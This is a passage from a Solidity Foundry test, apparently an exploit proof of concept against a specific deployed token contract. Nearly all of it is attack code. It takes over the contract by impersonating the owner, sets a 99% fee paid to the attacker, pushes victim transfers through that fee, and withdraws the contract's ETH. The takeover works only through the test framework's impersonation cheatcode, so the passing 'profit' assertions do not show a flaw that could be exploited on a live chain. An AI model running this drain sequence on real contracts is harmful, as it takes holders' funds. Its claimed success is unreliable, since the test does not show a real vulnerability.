    function balanceOf(address account) external view returns (uint256);
    function manualSend() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x05cd34a1D5dF5010F5eDb3412077B3c291DDb7a8;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        attacker = address(this);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Step 1: Get owner address from storage slot 0
        address owner = address(uint160(uint256(vm.load(TARGET, bytes32(uint256(0))))));

        // Step 2: Impersonate owner to authorize attacker
        vm.startPrank(owner);
        TARGET.call(abi.encodeWithSignature("authorize(address)", attacker));
        vm.stopPrank();

        // Step 3: Enable trading
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature("tradingStatus(bool)", true));

        // Step 4: Set fees to 99% - using 9900 for one component, 0 for others, denominator 10000
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature("setFees(uint256,uint256,uint256,uint256,uint256)", 9900, 0, 0, 0, 10000));

        // Step 5: Set attacker as marketingFeeReceiver (developmentReceiver can be DEAD)
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature("setFeeReceivers(address,address)", 0x000000000000000000000000000000000000dEaD, attacker));

        // Step 6: Get initial holder address (from constructor)
        address initialHolder = 0x4CE6D95Ba0f6CBEa8CdC43E1a77359E609bC730C;

        // Step 7: Create two victim addresses
        address victim1 = address(0x111);
        address victim2 = address(0x222);

        // Step 8: Impersonate initial holder to transfer tokens to victim1
        vm.prank(initialHolder);
        TARGET.call(abi.encodeWithSignature("transfer(address,uint256)", victim1, 1000 * 10**18));

        // Step 9: Have victim1 transfer to victim2 (this should incur 99% fee)
        vm.prank(victim1);
        TARGET.call(abi.encodeWithSignature("transfer(address,uint256)", victim2, 1000 * 10**18));

        // Step 10: Check contract token balance and trigger swap if needed
        (, bytes memory data) = TARGET.call(abi.encodeWithSignature("balanceOf(address)", TARGET));
        uint256 contractTokenBalance = abi.decode(data, (uint256));

        if (contractTokenBalance > 0) {
            // Trigger swap by having victim2 transfer small amount back to victim1
            vm.prank(victim2);
            TARGET.call(abi.encodeWithSignature("transfer(address,uint256)", victim1, 1 * 10**18));
        }

        // Step 11: Withdraw ETH via manualSend
        vm.prank(attacker);
        TARGET.call(abi.encodeWithSignature("manualSend()"));

        // Step 12: Check attacker's ETH balance increased
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertGt(attackerBalanceAfter, 0, "Attacker should have gained ETH");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

